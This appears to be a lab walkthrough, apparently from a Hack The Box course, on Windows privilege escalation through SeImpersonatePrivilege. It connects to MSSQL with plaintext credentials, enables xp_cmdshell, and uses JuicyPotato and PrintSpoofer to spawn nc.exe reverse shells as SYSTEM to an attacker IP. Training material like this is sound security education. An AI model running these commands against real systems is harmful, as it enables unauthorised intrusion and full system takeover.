## SeImpersonate Example - JuicyPotato
#### Connecting with MSSQLClient.py

Using the credentials `sql_dev:Str0ng_P@ssw0rd!`, let's first connect to the SQL server instance and confirm our privileges. We can do this using [mssqlclient.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/mssqlclient.py) from the `Impacket` toolkit.

```shell
3kjS@htb[/htb]$ mssqlclient.py sql_dev@10.129.43.30 -windows-auth
```
#### Enabling xp_cmdshell

```shell
SQL> enable_xp_cmdshell
```
#### Confirming Access

```shell
SQL> xp_cmdshell whoami

output                                                                             

--------------------------------------------------------------------------

nt service\mssql$sqlexpress01
```
#### Checking Account Privileges

```shell
SQL> xp_cmdshell whoami /priv
```
#### Escalating Privileges Using JuicyPotato

To escalate privileges using these rights, let's first download the ([JuicyPotato](https://github.com/ohpe/juicy-potato)) `JuicyPotato.exe` binary and upload this and `nc.exe` to the target server.

```shell
SQL> xp_cmdshell c:\tools\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\tools\nc.exe 10.10.14.3 8443 -e cmd.exe" -t *

output                                                                             

--------------------------------------------------------------------------

Testing {4991d34b-80a1-4291-83b6-3328366b9097} 53375                               
                                                                            
[+] authresult 0                                                                   
{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM                                                                                                    
[+] CreateProcessWithTokenW OK                                                     
[+] calling 0x000000000088ce08
```
#### Catching SYSTEM Shell

```shell
3kjS@htb[/htb]$ sudo nc -lnvp 8443
```
![](Screenshot%202026-08-18%20at%2017.36.22.png)
## PrintSpoofer and RoguePotato
#### Escalating Privileges using PrintSpoofer

```shell
SQL> xp_cmdshell c:\tools\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.14.3 8443 -e cmd"

output                                                                             

--------------------------------------------------------------------------

[+] Found privilege: SeImpersonatePrivilege                                        

[+] Named pipe listening...                                                        

[+] CreateProcessAsUser() OK                                                       

NULL
```
